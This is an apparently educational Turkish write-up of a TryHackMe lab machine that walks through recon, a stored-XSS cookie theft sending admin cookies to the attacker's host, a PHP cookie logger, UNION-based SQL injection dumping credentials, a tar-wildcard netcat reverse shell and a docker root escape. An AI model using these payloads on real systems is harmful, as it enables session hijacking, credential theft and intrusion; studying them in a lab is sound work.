# TR-TheMarketPlace-Writeup


 Merhabalar bugün sizlerle beraber Tryhackme'de bulunan "The Marketplace" adlı odayı çözümleyeceğiz. Bu yazıyı ayrıntılı yazmak istiyorum çünkü bu oda da kullanacağımız yolların uygulanabilmesi için teori kısmının iyi anlaşılması gerekiyor.

## İhtiyacımız olanlar toolar : 
- Nmap
- Dirsearch
- Netcat

### İlk Adım > Nmap
Bir sızma testinde veya herhangi bir CTF yarışmasında olsun bir sızma testinin en önemli aşaması hedef hakkında toplayabildiğimiz kadar bilgi toplamaktır.Çünkü Bir sistemin nasıl çalıştığını anlamazsak o sistemi istismar etmemiz imkansız olacaktır.

Bu yüzden ilk olarak "Nmap" ile cihaz üzerindeki portların ve servislerin keşfini yapacağız : 

  ```
nmap -Pn -p- -T5 <hedef ip>
```

![Foto](https://github.com/mel4mi/TR-Skynet-Writeup/blob/main/melami%40Melami_%20~%2030.08.2022%2023_22_19.png)
  
  Yazdığımız kodu adım adım açıklayalım: 
  
  Özellik:
  >-Pn parametresi : Tarama öncesi Ping Paketi atmaz (Hedef sistemi açık olarak kabul eder ve direk taramaya başlar.)
  
  Açıklama :
  
  >Nmap, Tarama yapacağı zaman ilk başta hedef sistemin açık olup olmadığını kontrol eder. Bunu hedef sisteme default olarak ping atarak kontrol eder.
  Bu taramanın sıkıntısı şurda Windows sistemlerde ping taramaları otomatik olarak bloke edilir.Bu yüzden eğer bir Windows sisteme tarama yaparsanız nmap cihazın offline olduğunu kabul eder ve tarama daha başlamadan biter.
  
Özellik:
  
  >-p- parametresi : Bu Paramtere sistem üzerinde açık bırakılan portları bulmak için bütün portları taramasını söyler.
  
Açıklama :
  
  >Nmap, Default olarak hedef sistemde en popüler 1000 portu tarar. Örnek olarak :


Portlar  | Servisler
------------- | -------------
20  | Ftp
22  | ssh
80  | http
445 | Smb

Özellik : 
>-T5 parametresi : Taramayı hızlı yapmasını söyler

Açıklama : 
>Nmap'de 5 adet tarama hızı vardır (T1,T2,T3,T4,T5). Sayı arttıkça tarama hızı artar. Eğer yüksek hızda tarama yaparsanız artıları eksikleri şunlardır :

>Artısı : taramaları hızlıca yapabilirsiniz.

>Eksileri : yüksek tarama hızlarında firewall veya loglama cihazları tarafından kolayca farkedilirsiniz ve engellersiniz.


Şimdi bulduğumuz portlar üzerinde yoğunlaşalım.

```
Nmap -Pn -p 22,80,32768 -T5 -sV <hedef ip>
```

![Foto](https://github.com/mel4mi/TR-Skynet-Writeup/blob/main/melami%40Melami_%20~%2030.08.2022%2023_37_51.png)

Yeni parametremizi hızlıca açıklayalım : 

  Özellik:
  >-sV parametresi : Açık olan portlarda bulunan servisleri ve servis versiyonları bulur.
  
  Açıklama :
  
  >Versiyon tespiti CTF ve sızma testlerinde bulunan eski servisleri exploit-db sorgularatarak uygun zaafiyeti bulmamıza yarar
  
  şuan bulduğumuz sonuçlar bizimm işimize yaramıyor o zaman 2. aşamaya geçelim.
  
  
  ## 2. Adım > Dirsearch
  
  Dirsearch ile hedef site üzerinde saklanmış alt klasörleri bulabiliriz.
  
  kullanımı gayet basittir.
  
  ```
  dirsearch -u "hedef sitenin url'si"
  ```
![Foto](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/melami%40Melami_%20~_Main%2031.08.2022%2000_29_26.png)

Açıklama : 
>Http protokolünde status code'lar(durum kodları) vardır. Bunlar siteye ulaşım hakkında bilgiler verir 4xx(403 ulaşılamayan), 3xx(301 Yönlendirme), 2xx(200 ulaşılabilen)

burda önemli olan şey robots.txt dosyasıdır. Bu dosyayı basitçe açıklamak gerekirse Robots.txt sitenizin sınır kapılarını kontrol etmeye benzer. Arama motoru robotlarının hangi sınır kapılarından girebileceğini hangilerinden giremeyeceğini belirtir.

![Foto](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/Kali%20Linux%20%E2%80%94%20Mozilla%20Firefox%20(kali-linux)%2031.08.2022%2000_36_26.png)

>Biz Robots.txt'e baktığımızda google aramalarında "/admin" başlıklı sayfaları göstermemesini söylemiş. Burası bizim için önemli olabilir.

şimdilik toplayacaklarımız bu kadar artık sitede çalışmaya başlayabiliriz.


## 3.Aşama > Site keşfi

![Foto](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/The%20Marketplace%20%E2%80%94%20Mozilla%20Firefox%20(kali-linux)%2031.08.2022%2000_44_43.png)

>Siteye baktığımızda basit bir alışveriş sitesi gibi gözüküyor. İlgimi çeken şey siteye giriş yapabiliyor olmam.

![Foto](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/Log%20in%20%E2%80%94%20Mozilla%20Firefox%20(kali-linux)%2031.08.2022%2000_45_22.png)


>Farkettiyseniz Yukarıdaki menüde yeni ürün ekleme seçeneğimiz geldi. Yeni bir ürün ekleme sayfasına göz atalım.

![Foto](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/http___10.10.50.224_%20%E2%80%94%20Mozilla%20Firefox%20(kali-linux)%2031.08.2022%2001_01_37.png)

>Buraya baktığımızda dosya yüklemeye izin vermemesi bizim "File upload" Zaafiyetlerinin önüne geçilmiş.

>Bu sitede ilan yayınlayabilmemiz demek aslında sitenin database'inde yazdığımız verilerimizin saklanması anlamına geliyor. Peki bunun bize yararı ne diye sorarsanız açıklayayım.
>velevki biz siteye normal bir ilan vermek yerine zararlı bir kod yazsak. yazdığımız zararlı kod da database de saklanacak. Bunun da sonucunda siteyi ziyaret eden herkesin bilgisayarında bizim ilanımız adı altında aslında bizim zararlı kodumuz çalışacak.Bu sayede hedef sistemde kod çalıştırabileceğiz. Bu zaafiyetin adı "Stored xss" diye geçiyor( daha fazla bilgi için : [XSS](https://portswigger.net/web-security/cross-site-scripting) )

xss Payloadımı yazıp test ediyorum : 
```
  <script>alert(1)</script>
  ```

![Foto](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/Add%20new%20listing%20%E2%80%94%20Mozilla%20Firefox%20(kali-linux)%2031.08.2022%2001_15_22.png)


![Foto](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/Add%20new%20listing%20%E2%80%94%20Mozilla%20Firefox%20(kali-linux)%2031.08.2022%2001_15_26.png)

Çalıştı.


İlanımızın site içindeki görüntüsü böyle ilginç olan şey ürünümüzü sitenin adminlerine şikayet edebiliyor olmamız.


Şikayet ediyoruz.


![Foto](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/Messages%20%E2%80%94%20Mozilla%20Firefox%20(kali-linux)%2031.08.2022%2001_16_44.png)

Ve adminlerden cevap geldi. İlanımızda siteyi bozan başı şeyler olduğunu söylediler ve ilanımı kaldırdılar.

>Şimdi işin mantık kısmına gireceğiz. Bana kalırsa aslında hackerlık dediğimiz şey bir bakış açısı. Bir sistemin nasıl çalıştığını anlayıp bunu nasıl kendisi için kullanıcağını akıl edebilmesidir. Şimdi burda nasıl düşünmemiz gerektiğini anlatıcağım.

>Ben siteye zararlı bir kod yazabiliyorum ve bu kod çalışıyor.Daha sonra zararlı kodumun incelemesi için adminlere atabiliyorum. O zaman zararlı kodum görüntülendiği anda adminin bilgisayarında da çalışması gerekmez mi ? Bu anlattığım xss zaafiyetinin mantığıydı, bunu cepte tutun.

>Şimdi ise cookie(çerez) mantığını anlamamız lazım. Hemen hemen her siteye girdiğimizde "Çerez Politikası" diye bir pop-up sürekli ekranlarımızda çıkmaya başladı. Peki bu çerezler nedir ? 
>aslında çerez dediğimiz şey, bizim sitedeki benzersiz kimliğimiz ( bir nevi tc kimlik numaramız gibi ). Sadece bize özel ve her siteye girdiğimizde site bizden bu çerezi alıyor, çözümlüyor ve bizi tanıyor. Bu yüzden siz internette bir laptop baktığınızda sürekli önünüze laptoplarla alakalı reklamlar geliyor. Peki bu çerezler sadece reklam için mi kullanılıyor ? Hayır. Mesela kullanıclara yetki vermek içinde kullanılıyor. adminin çerezi ile normal bir kullacının çerezinde fark olması lazım.

>Peki siteler bizim cihazlarımızda tutulan bu çerezleri istediği gibi çekebiliyorsa benim zaafiyetli sitem de ziyaretçilerimin çerezlerini çekemez mi ?

>Eğer buraya kadar anladıysanız bu çaldığımız çerez ile ne yapıcağımı anlatayım. Ben adminin kullanıcı adı ve şifresini bilmiyorum ve kıramadım. O yüzden "pass to cookie" diye adlandırılan yöntemi kullanarak adminin kullanıcı adını şifresini bilmeden sadece benim siteme yönlendirerek ona ait olan çerezleri çalıcam sonra bu çaldığım çerezi siteye ben adminmişim gibi tanıttığımda adminin hesabına erişmiş olacağım. Ve bütün bunları yaparken adminin kullanıcı adı ve şifresini kullanmamış olacağım. 

Bu mantıktan yola çıkarak kendimize zaafiyetli bir php sayfası oluşturalım. ( yada linkten direk klonlayın [Cookie-stealer](https://github.com/tacticthreat/CookieHeist) )

Zaafiyetli php sitesi kodu : 
```
<?php
$cookie = $_GET['c'];
$fp = fopen('log.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);
?>
```

Sonrasında bu php sayfasına diğer makinelerin erişebilmesi için http server olarak ayağa kaldıralım :

```
python3 -m http.server 8081
```

Hazırlıklar tamam şimdi siteye zararlı kodumuzu yazalım : 

```
<script javascript:text>document.location="http://(kendi ip adresinizi yazın):8081/cookiesteal-simple.php?c=" + document.cookie + "&t=Alert"; </script>
```
![cookie_track](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/cookie_track.png)

İlanı yayımladıktan sonra site adminlerinin görmesi için şikayet ediyorum : 
Biraz bekledikten sonra http server açtığımız terminale dönüyorum ve adminin cookilerini çalındığını görüyorum.
 
 ![cookie_steal](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/cookie_steal.jpg)
 
 Daha iyi anlamak için cookienin içeriğine bakalım. [Online cookie encode](https://jwt.io/)

![cookie_info](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/cookie_encode.jpg)

Cookie sahibi michael adında bir admin kullanıcısına ait. O zaman bu cookie ile giriş yapalım.

>f12 tuşuna basın yada siteye sağ tıklayıp geliştirici seçeneklerini açın sonrasında storage kısmında cookie sekmesini açın.

Value değerini çaldığımız cookie ile değiştirip sayfayı yenileyin ( f5 ).

![cookie_change](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/Log%20in%20%E2%80%94%20Mozilla%20Firefox%20(kali-linux)%204.09.2022%2017_37_40.png)

Artık adminiz.

Ve admin paneline girdiğimizde ilk flag'ımızı buluyoruz.

![ilk_flag](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/ilk_flag.jpg)

Karşımıza çıkan 4 kişiden birine tıklayın ve url e bakın

![sql_detect](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/sql_detect.png)

Burda sql zaafiyeti var ve bunu sömürmemiz gerekiyor.

Sql Zaafiyeti için: 
```
ADIM 1 : /admin?user=0 union select 1,2,3,4 -- -

ADIM 2 : /admin?user=0 union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -

ADIM 3 : /admin?user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'-- -

ADIM 4 : /admin?user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='users'-- -

ADIM 5 : /admin?user=0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -

ADIM 6 : /admin?user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='messages'-- -,

ADIM 7 : /admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -
```
 >sqli(sql injection için özel bir writeup yazacağım o yüzden burda anlatmıyorum.


![secret_message](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/secret%20message.png)

Burda bize jake kullanısının eski ssh şifresinin çok güçsüz(kolay kırılabilen) olduğunu söylüyor. Bu yüzden de sistem tarafından otomatik olarak daha güçlü bir şifre oluşturulduğunu ve bu şifreyi de posta ile gönderdiğini görüyoruz.

Bu demek oluyor ki artık sisteme ssh bağlantısı alıp rahat rahat kod yazabileceğiz


```
ssh jake@hedef_ip 
```
E-postadan öğrendiğimiz şifreyi girin.

![jake_ssh](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/jake_ssh.png)

2. flagımızı da bulduk.

Yetki yükseltme saldırısı yapmak için ilk başta sudo bitlerine bakıyorum.

```
sudo -l
```
![sudo](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/sudo%20priv.png)


Michael yetkileriyle çalışan bir .sh dosyası var. Eğer bu dosyayı sömürebilirsek michael adına shell alabiliriz.

![backup](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/backup_ls.png)

Reverse-Shell alabilmek için shell.sh dosyasını manupile ediyoruz.

```
cat > /opt/backups/shell.sh << EOF
#!/bin/bash     
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc (kendi ip adresini yaz) 4444 >/tmp/f 
EOF      
```


```
jake@the-marketplace:~$ chmod +x /opt/backups/shell.sh                              //yazdığımız shell.sh dosyasına okuma+yazma+değiştirme yetkisini veriyoruz.
jake@the-marketplace:~$ touch "/opt/backups/--checkpoint=1"                         //checkpoint noktası oluşturuyoruz.
jake@the-marketplace:~$ touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"   // oluşturduğumuz checkpoint noktasının eylemini belirtiyoruz.
jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh                      //michael adında backup dosyamızı çalıştırıyoruz.
```
Çalıştırmadan önce kendi terminalinizde "nc listener" açın : 

```
melami㉿Melami> nc -lvnp 4444
```
![nc](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/nc.png)

Tekrar ssh bağlantısına geri dönün. Kodu çalıştırmadan önce backup.tar dosyasını silin.

Çünkü backup.sh dosyası çalıştığında backup.tar dosyasını bulamayınca aynı dizinde bulunan bizim belirttiğimiz dosyayı çalıştıracaktır.

```
rm backup.tar
sudo -u michael /opt/backups/backup.sh
```
Michael adına reverse shell alabildik.

![michael](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/micheal%20shell.png)

```
id
```
![id](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/michael_id.png)

Michael docker için yetkilendirilmiş bir kullanıcı o zaman docker ile root kullanıcı olmaya çalışalım.(Yetki yükseltme saldırıları için hayat kurtaran site : [GFTOBins](https://gtfobins.github.io/#)

Docker imaj listesi için:

![docker](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/docker%20list.png)

"alpine" üzerinden yetki yükseltebiliriz.

![gftobins](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/gftobins-docker.png)

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![priv](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/priv_root.png)

Artık rootuz ve son bayrak için : 

```
cd /root
cat root.txt
```

## Bitiriş
Bu benim ilk writeup denememdi,daha çok ayrıntı vermek isterdim ama yazı çok fazla uzadığı için derin konuları başka writeuplarda yazmayı planlıyorum.
Umarım işinize yaramıştır.
Eksik ve Hatalar için lütfen benle iletişme geçin.
İyi günler sağlıcakla kalın.



